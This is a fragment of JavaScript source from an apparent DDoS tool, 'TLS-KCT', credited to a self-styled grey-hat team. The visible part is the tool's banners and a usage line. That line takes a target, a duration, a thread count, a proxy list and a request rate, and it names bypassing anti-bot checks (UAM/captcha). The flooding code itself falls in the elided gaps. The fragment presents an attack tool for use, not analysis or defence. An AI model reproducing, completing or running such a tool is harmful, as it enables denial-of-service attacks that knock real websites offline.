...
`)
 console.log(`Method DDoS By MrVxdx1-Xploit\n Ketapang Grey Hat Team\n Usage: node TLS-KCT target time thread proxy.txt rate uam/captha`); process.exit();}
 const headers = {};
...
console.log(`Methods: TLS-KCT`)
console.log(`Methods DDoS By MrVxdx1-Xploit`)
console.log(`Methods DDoS By Ketapang Grey Hat Team`)
console.log(`--------------------------------------------`)
